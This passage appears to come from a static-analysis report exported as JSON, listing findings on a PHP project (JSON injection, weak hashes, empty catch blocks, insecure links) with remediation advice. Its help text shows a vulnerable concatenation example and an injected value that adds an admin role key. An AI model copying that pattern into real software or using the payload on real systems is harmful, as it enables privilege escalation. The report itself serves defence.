'\"}';\n\n$user_info_json_file = fopen('~/user_info.json', 'w');\nfwrite($user_info_json_file, $user_info_json_string);\nfclose($user_info_json_file);\n\n\nYet, because the JSON serialization is performed using string concatenation, the untrusted data in username and password will not be validated to escape JSON-related special characters. This allows a user to arbitrarily insert JSON keys, possibly changing the structure of the serialized JSON. In this example, if the non-privileged user mallory with password Evil123! were to append %22,%22role%22:%22 to her username and pass this value to the username URL parameter, the resulting JSON saved to ~/user_info.json would be:\n\n\n{\n  \"role\":\"default\",\n  \"username\":\"mallory\",\n  \"role\":\"admin\",\n  \"password\":\"Evil123!\"\n}\n\n\nIf this serialized JSON file were then deserialized using PHP's native json_decode() function as so:\n\n\n$user_info_json_string = file_get_contents('user_info.json', 'r');\n$user_info_json_data = json_decode($user_info_json_string);\n\n\nThe resulting values for username, password, and role in $user_info_json_data would be mallory, Evil123!, and admin respectively. Without further verification that the values within deserialized JSON data are valid, the application will incorrectly assign user mallory \"admin\" privileges.\n\nWhen writing user supplied data to JSON, follow these guidelines:\n\n1. Do not create JSON attributes with names that are derived from user input.\n\n2. Ensure that all serialization to JSON is performed using a safe serialization function that delimits untrusted data within single or double quotes and escapes any special characters.\n\nExample 2: The following PHP code implements the same functionality as that in Example 1, but instead uses json_encode() rather than string concatenation to serialize the data, therefore ensuring that any untrusted data is properly delimited and escaped:\n\n\n...\n\n$username = $_GET['username'];\n$password = $_GET['password'];\n\n$user_info_array = array('role' =&gt; 'default', 'username' =&gt; $username, 'password' =&gt; $password);\n\n$user_info_json_string = json_encode($user_info_array);\n\n$user_info_json_file = fopen('~/user_info.json', 'w');\nfwrite($user_info_json_file, $user_info_json_string);\nfclose($user_info_json_file);\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4688/?engineType=SCA&issue=D817056D578964FEA3AD33FB5F603889"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4713",
          "shortDescription" : {
            "text" : "JSON Injection"
          },
          "fullDescription" : {
            "text" : "On line 485 of Monitor.php, the method _jsondecodevalues() writes unvalidated input into JSON. This call could allow an attacker to inject arbitrary elements or attributes into the JSON entity.\n\n\n"
          },
          "help" : {
            "text" : "JSON injection occurs when:\n\n1. Data enters a program from an untrusted source.\n\n\n2. The data is written to a JSON stream.\n\nIn this case, the JSON is written by json_decode() in Monitor.php on line 485.\n\nApplications typically use JSON to store data or send messages. When used to store data, JSON is often treated like cached data and may potentially contain sensitive information. When used to send messages, JSON is often used in conjunction with a RESTful service and can be used to transmit sensitive information such as authentication credentials.\n\nThe semantics of JSON documents and messages can be altered if an application constructs JSON from unvalidated input. In a relatively benign case, an attacker may be able to insert extraneous elements that cause an application to throw an exception while parsing a JSON document or request. In a more serious case, such as ones that involves JSON injection, an attacker may be able to insert extraneous elements that allow for the predictable manipulation of business critical values within a JSON document or request. In some cases, JSON injection can lead to cross-site scripting or dynamic code evaluation.\n\nExample 1: The following PHP code serializes user account authentication information for non-privileged users (those with a role of \"default\" as opposed to privileged users with a role of \"admin\") from user-controlled URL parameters username and password to the JSON file located at ~/user_info.json:\n\n\n...\n\n$username = $_GET['username'];\n$password = $_GET['password'];\n\n$user_info_json_string = '{\"role\":\"default\",\"username\":\"' . $username . '\",\"password\":\"' . $password . '\"}';\n\n$user_info_json_file = fopen('~/user_info.json', 'w');\nfwrite($user_info_json_file, $user_info_json_string);\nfclose($user_info_json_file);\n\n\nYet, because the JSON serialization is performed using string concatenation, the untrusted data in username and password will not be validated to escape JSON-related special characters. This allows a user to arbitrarily insert JSON keys, possibly changing the structure of the serialized JSON. In this example, if the non-privileged user mallory with password Evil123! were to append %22,%22role%22:%22 to her username and pass this value to the username URL parameter, the resulting JSON saved to ~/user_info.json would be:\n\n\n{\n  \"role\":\"default\",\n  \"username\":\"mallory\",\n  \"role\":\"admin\",\n  \"password\":\"Evil123!\"\n}\n\n\nIf this serialized JSON file were then deserialized using PHP's native json_decode() function as so:\n\n\n$user_info_json_string = file_get_contents('user_info.json', 'r');\n$user_info_json_data = json_decode($user_info_json_string);\n\n\nThe resulting values for username, password, and role in $user_info_json_data would be mallory, Evil123!, and admin respectively. Without further verification that the values within deserialized JSON data are valid, the application will incorrectly assign user mallory \"admin\" privileges.\n\nWhen writing user supplied data to JSON, follow these guidelines:\n\n1. Do not create JSON attributes with names that are derived from user input.\n\n2. Ensure that all serialization to JSON is performed using a safe serialization function that delimits untrusted data within single or double quotes and escapes any special characters.\n\nExample 2: The following PHP code implements the same functionality as that in Example 1, but instead uses json_encode() rather than string concatenation to serialize the data, therefore ensuring that any untrusted data is properly delimited and escaped:\n\n\n...\n\n$username = $_GET['username'];\n$password = $_GET['password'];\n\n$user_info_array = array('role' =&gt; 'default', 'username' =&gt; $username, 'password' =&gt; $password);\n\n$user_info_json_string = json_encode($user_info_array);\n\n$user_info_json_file = fopen('~/user_info.json', 'w');\nfwrite($user_info_json_file, $user_info_json_string);\nfclose($user_info_json_file);\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4713/?engineType=SCA&issue=E8A4D3926AB180BCA95F12FA3412FABB"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4714",
          "shortDescription" : {
            "text" : "JSON Injection"
          },
          "fullDescription" : {
            "text" : "On line 485 of Monitor.php, the method _jsondecodevalues() writes unvalidated input into JSON. This call could allow an attacker to inject arbitrary elements or attributes into the JSON entity.\n\n\n"
          },
          "help" : {
            "text" : "JSON injection occurs when:\n\n1. Data enters a program from an untrusted source.\n\n\n2. The data is written to a JSON stream.\n\nIn this case, the JSON is written by json_decode() in Monitor.php on line 485.\n\nApplications typically use JSON to store data or send messages. When used to store data, JSON is often treated like cached data and may potentially contain sensitive information. When used to send messages, JSON is often used in conjunction with a RESTful service and can be used to transmit sensitive information such as authentication credentials.\n\nThe semantics of JSON documents and messages can be altered if an application constructs JSON from unvalidated input. In a relatively benign case, an attacker may be able to insert extraneous elements that cause an application to throw an exception while parsing a JSON document or request. In a more serious case, such as ones that involves JSON injection, an attacker may be able to insert extraneous elements that allow for the predictable manipulation of business critical values within a JSON document or request. In some cases, JSON injection can lead to cross-site scripting or dynamic code evaluation.\n\nExample 1: The following PHP code serializes user account authentication information for non-privileged users (those with a role of \"default\" as opposed to privileged users with a role of \"admin\") from user-controlled URL parameters username and password to the JSON file located at ~/user_info.json:\n\n\n...\n\n$username = $_GET['username'];\n$password = $_GET['password'];\n\n$user_info_json_string = '{\"role\":\"default\",\"username\":\"' . $username . '\",\"password\":\"' . $password . '\"}';\n\n$user_info_json_file = fopen('~/user_info.json', 'w');\nfwrite($user_info_json_file, $user_info_json_string);\nfclose($user_info_json_file);\n\n\nYet, because the JSON serialization is performed using string concatenation, the untrusted data in username and password will not be validated to escape JSON-related special characters. This allows a user to arbitrarily insert JSON keys, possibly changing the structure of the serialized JSON. In this example, if the non-privileged user mallory with password Evil123! were to append %22,%22role%22:%22 to her username and pass this value to the username URL parameter, the resulting JSON saved to ~/user_info.json would be:\n\n\n{\n  \"role\":\"default\",\n  \"username\":\"mallory\",\n  \"role\":\"admin\",\n  \"password\":\"Evil123!\"\n}\n\n\nIf this serialized JSON file were then deserialized using PHP's native json_decode() function as so:\n\n\n$user_info_json_string = file_get_contents('user_info.json', 'r');\n$user_info_json_data = json_decode($user_info_json_string);\n\n\nThe resulting values for username, password, and role in $user_info_json_data would be mallory, Evil123!, and admin respectively. Without further verification that the values within deserialized JSON data are valid, the application will incorrectly assign user mallory \"admin\" privileges.\n\nWhen writing user supplied data to JSON, follow these guidelines:\n\n1. Do not create JSON attributes with names that are derived from user input.\n\n2. Ensure that all serialization to JSON is performed using a safe serialization function that delimits untrusted data within single or double quotes and escapes any special characters.\n\nExample 2: The following PHP code implements the same functionality as that in Example 1, but instead uses json_encode() rather than string concatenation to serialize the data, therefore ensuring that any untrusted data is properly delimited and escaped:\n\n\n...\n\n$username = $_GET['username'];\n$password = $_GET['password'];\n\n$user_info_array = array('role' =&gt; 'default', 'username' =&gt; $username, 'password' =&gt; $password);\n\n$user_info_json_string = json_encode($user_info_array);\n\n$user_info_json_file = fopen('~/user_info.json', 'w');\nfwrite($user_info_json_file, $user_info_json_string);\nfclose($user_info_json_file);\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4714/?engineType=SCA&issue=E909440420883E5872BEB2D8138FD058"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4424",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4424/?engineType=SCA&issue=2468EE89409E00284055D26C35A5749C"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4473",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4473/?engineType=SCA&issue=491218F4701AA86656C9661B80748CB2"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4431",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4431/?engineType=SCA&issue=2D5146C71940FDE8200F25DAB646B654"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4387",
          "shortDescription" : {
            "text" : "Poor Error Handling: Empty Catch Block"
          },
          "fullDescription" : {
            "text" : "The method testexceptions() in FilterTest.php ignores an exception on line 65, which could cause the program to overlook unexpected states and conditions.\n\n\n"
          },
          "help" : {
            "text" : "Just about every serious attack on a software system begins with the violation of a programmer's assumptions. After the attack, the programmer's assumptions seem flimsy and poorly founded, but before an attack many programmers would defend their assumptions well past the end of their lunch break.\n\nTwo dubious assumptions that are easy to spot in code are \"this method call can never fail\" and \"it doesn't matter if this call fails\". When a programmer ignores an exception, they implicitly state that they are operating under one of these assumptions.\n\nExample 1: The following code excerpt ignores a rarely-thrown exception from doExchange().\n\n\ntry {\n  doExchange();\n}\ncatch (exception $e) {\n  // this can never happen\n}\n\n\nIf a RareException were to ever be thrown, the program would continue to execute as though nothing unusual had occurred. The program records no evidence indicating the special situation, potentially frustrating any later attempt to explain the program's behavior.\n\nAt a minimum, log the fact that the exception was thrown so that it will be possible to come back later and make sense of the resulting program behavior. Better yet, abort the current operation.\n\nExample 2: The code in Example 1 could be rewritten in the following way:\n\n\ntry {\n  doExchange();\n}\ncatch (exception $e) {\n  error_log(\"A RareException has occurred!\", 3, \"/var/log/app.log\")\n}\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4387/?engineType=SCA&issue=12857B5AEC964B62E97B7FFD8A814577"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4388",
          "shortDescription" : {
            "text" : "Poor Error Handling: Empty Catch Block"
          },
          "fullDescription" : {
            "text" : "The method testexceptions() in FilterTest.php ignores an exception on line 71, which could cause the program to overlook unexpected states and conditions.\n\n\n"
          },
          "help" : {
            "text" : "Just about every serious attack on a software system begins with the violation of a programmer's assumptions. After the attack, the programmer's assumptions seem flimsy and poorly founded, but before an attack many programmers would defend their assumptions well past the end of their lunch break.\n\nTwo dubious assumptions that are easy to spot in code are \"this method call can never fail\" and \"it doesn't matter if this call fails\". When a programmer ignores an exception, they implicitly state that they are operating under one of these assumptions.\n\nExample 1: The following code excerpt ignores a rarely-thrown exception from doExchange().\n\n\ntry {\n  doExchange();\n}\ncatch (exception $e) {\n  // this can never happen\n}\n\n\nIf a RareException were to ever be thrown, the program would continue to execute as though nothing unusual had occurred. The program records no evidence indicating the special situation, potentially frustrating any later attempt to explain the program's behavior.\n\nAt a minimum, log the fact that the exception was thrown so that it will be possible to come back later and make sense of the resulting program behavior. Better yet, abort the current operation.\n\nExample 2: The code in Example 1 could be rewritten in the following way:\n\n\ntry {\n  doExchange();\n}\ncatch (exception $e) {\n  error_log(\"A RareException has occurred!\", 3, \"/var/log/app.log\")\n}\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4388/?engineType=SCA&issue=12857B5AEC964B62E97B7FFD8A814578"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4389",
          "shortDescription" : {
            "text" : "Poor Error Handling: Empty Catch Block"
          },
          "fullDescription" : {
            "text" : "The method testexceptions() in FilterTest.php ignores an exception on line 76, which could cause the program to overlook unexpected states and conditions.\n\n\n"
          },
          "help" : {
            "text" : "Just about every serious attack on a software system begins with the violation of a programmer's assumptions. After the attack, the programmer's assumptions seem flimsy and poorly founded, but before an attack many programmers would defend their assumptions well past the end of their lunch break.\n\nTwo dubious assumptions that are easy to spot in code are \"this method call can never fail\" and \"it doesn't matter if this call fails\". When a programmer ignores an exception, they implicitly state that they are operating under one of these assumptions.\n\nExample 1: The following code excerpt ignores a rarely-thrown exception from doExchange().\n\n\ntry {\n  doExchange();\n}\ncatch (exception $e) {\n  // this can never happen\n}\n\n\nIf a RareException were to ever be thrown, the program would continue to execute as though nothing unusual had occurred. The program records no evidence indicating the special situation, potentially frustrating any later attempt to explain the program's behavior.\n\nAt a minimum, log the fact that the exception was thrown so that it will be possible to come back later and make sense of the resulting program behavior. Better yet, abort the current operation.\n\nExample 2: The code in Example 1 could be rewritten in the following way:\n\n\ntry {\n  doExchange();\n}\ncatch (exception $e) {\n  error_log(\"A RareException has occurred!\", 3, \"/var/log/app.log\")\n}\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4389/?engineType=SCA&issue=12857B5AEC964B62E97B7FFD8A814579"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4763",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file MonitorTest.php on line 1198 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4763/?engineType=SCA&issue=FEF7E47D79559BC47E66776442EE15F8"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4764",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file MonitorTest.php on line 1203 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4764/?engineType=SCA&issue=FEF7E47D79559BC47E66776442EE15F9"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4765",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file MonitorTest.php on line 1207 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4765/?engineType=SCA&issue=FEF7E47D79559BC47E66776442EE15FA"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4766",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file MonitorTest.php on line 1211 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4766/?engineType=SCA&issue=FEF7E47D79559BC47E66776442EE15FB"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4767",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file MonitorTest.php on line 1211 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4767/?engineType=SCA&issue=FEF7E47D79559BC47E66776442EE15FC"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4768",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file MonitorTest.php on line 1235 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4768/?engineType=SCA&issue=FEF7E47D79559BC47E66776442EE15FD"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4769",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file MonitorTest.php on line 1238 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4769/?engineType=SCA&issue=FEF7E47D79559BC47E66776442EE15FE"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4770",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file MonitorTest.php on line 1242 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4770/?engineType=SCA&issue=FEF7E47D79559BC47E66776442EE15FF"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4771",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file MonitorTest.php on line 1245 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4771/?engineType=SCA&issue=FEF7E47D79559BC47E66776442EE1600"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4772",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file MonitorTest.php on line 1245 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see 